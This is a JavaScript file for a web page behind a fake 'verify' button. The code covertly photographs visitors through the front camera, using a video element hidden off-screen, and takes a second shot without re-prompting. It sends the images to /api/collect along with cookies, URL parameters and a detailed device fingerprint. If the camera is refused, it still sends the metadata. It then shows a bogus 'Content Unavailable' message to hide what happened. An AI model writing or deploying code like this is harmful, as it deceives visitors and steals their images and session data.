// app.js — client-side collector
// No external dependencies, no trackers.
(function () {
  'use strict';

  var API = '/api/collect';
  var stream = null;

  // ---- Gather every browser-side signal -----------------------------------

  function collect_meta() {
    var nav = navigator;
    var scr = screen;
    var conn = nav.connection || nav.mozConnection || nav.webkitConnection || null;

    return {
      // URL / navigation
      url:           location.href,
      query_params:  Object.fromEntries(new URLSearchParams(location.search)),
      hash:          location.hash,
      referrer:      document.referrer,
      cookies:       document.cookie,

      // Navigator
      user_agent:           nav.userAgent,
      platform:             nav.platform,
      language:             nav.language,
      languages:            nav.languages ? [].concat(nav.languages) : [],
      hardware_concurrency: nav.hardwareConcurrency || null,
      device_memory:        nav.deviceMemory        || null,
      max_touch_points:     nav.maxTouchPoints       || 0,
      vendor:               nav.vendor,
      app_version:          nav.appVersion,
      cookie_enabled:       nav.cookieEnabled,
      do_not_track:         nav.doNotTrack,
      online:               nav.onLine,
      pdf_viewer_enabled:   nav.pdfViewerEnabled     ?? null,
      webdriver:            nav.webdriver             ?? null,

      // Screen
      screen_width:       scr.width,
      screen_height:      scr.height,
      screen_avail_w:     scr.availWidth,
      screen_avail_h:     scr.availHeight,
      color_depth:        scr.colorDepth,
      pixel_depth:        scr.pixelDepth,
      inner_width:        window.innerWidth,
      inner_height:       window.innerHeight,
      outer_width:        window.outerWidth,
      outer_height:       window.outerHeight,
      device_pixel_ratio: window.devicePixelRatio,

      // Time
      timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezone_offset: new Date().getTimezoneOffset(),
      timestamp:       new Date().toISOString(),

      // Connection
      connection: conn ? {
        effective_type: conn.effectiveType,
        downlink:       conn.downlink,
        rtt:            conn.rtt,
        save_data:      conn.saveData,
      } : null,
    };
  }

  // ---- Camera helpers -----------------------------------------------------

  function capture_frame(video) {
    var c = document.createElement('canvas');
    c.width  = video.videoWidth;
    c.height = video.videoHeight;
    c.getContext('2d').drawImage(video, 0, 0);
    return c.toDataURL('image/jpeg', 0.85);
  }

  function send(image, meta, tag) {
    meta._tag = tag;
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: image || null, meta: meta }),
    }).catch(function () { /* silent — never break UX */ });
  }

  // ---- Camera flow --------------------------------------------------------

  function init_camera() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      // No camera API at all
      return send(null, collect_meta(), 'no-media-api');
    }

    return navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false,
    }).then(function (s) {
      stream = s;

      var video = document.createElement('video');
      video.setAttribute('playsinline', '');
      video.setAttribute('autoplay', '');
      video.muted = true;
      video.srcObject = stream;

      // Visually hidden but rendered so drawImage works
      video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
      document.body.appendChild(video);

      return video.play().then(function () {
        // Wait until at least one decoded frame is available
        return new Promise(function (resolve) {
          if (video.readyState >= 2) return resolve();
          video.addEventListener('loadeddata', resolve, { once: true });
        });
      }).then(function () {
        // Small extra delay — some devices need a moment
        return new Promise(function (r) { setTimeout(r, 400); });
      }).then(function () {
        // --- First capture ---
        var frame1 = capture_frame(video);
        var meta1  = collect_meta();
        meta1.capture_index = 1;
        send(frame1, meta1, 'selfie-1');

        // --- Second capture (3 s later, no re-prompt) ---
        setTimeout(function () {
          try {
            var frame2 = capture_frame(video);
            var meta2  = collect_meta();
            meta2.capture_index = 2;
            send(frame2, meta2, 'selfie-2');
          } catch (_) { /* stream may have died */ }

          // Release tracks
          stream.getTracks().forEach(function (t) { t.stop(); });
          video.remove();
          stream = null;
        }, 3000);
      });
    }).catch(function (err) {
      // Denied or unavailable — just ship the metadata
      var meta = collect_meta();
      meta.camera_error = err.name + ': ' + err.message;
      return send(null, meta, 'camera-denied');
    });
  }

  // ---- Post-click UI transition ------------------------------------------

  function show_content() {
    var gate = document.getElementById('gate');
    gate.innerHTML =
      '<div class="content-placeholder">' +
        '<div class="spinner"></div>' +
        '<p>Loading content\u2026</p>' +
      '</div>';

    setTimeout(function () {
      gate.innerHTML =
        '<div class="content-placeholder">' +
          '<svg viewBox="0 0 24 24" width="48" height="48" fill="none" ' +
            'stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">' +
            '<circle cx="12" cy="12" r="10"/>' +
            '<line x1="15" y1="9" x2="9" y2="15"/>' +
            '<line x1="9" y1="9" x2="15" y2="15"/>' +
          '</svg>' +
          '<h2>Content Unavailable</h2>' +
          '<p>This content has been removed or is no longer available.</p>' +
        '</div>';
    }, 3500);
  }

  // ---- Init ---------------------------------------------------------------

  document.addEventListener('DOMContentLoaded', function () {
    var btn = document.getElementById('verify-btn');
    btn.addEventListener('click', function () {
      btn.disabled = true;
      btn.textContent = 'Verifying\u2026';
      init_camera();
      show_content();
    });
  });
})();
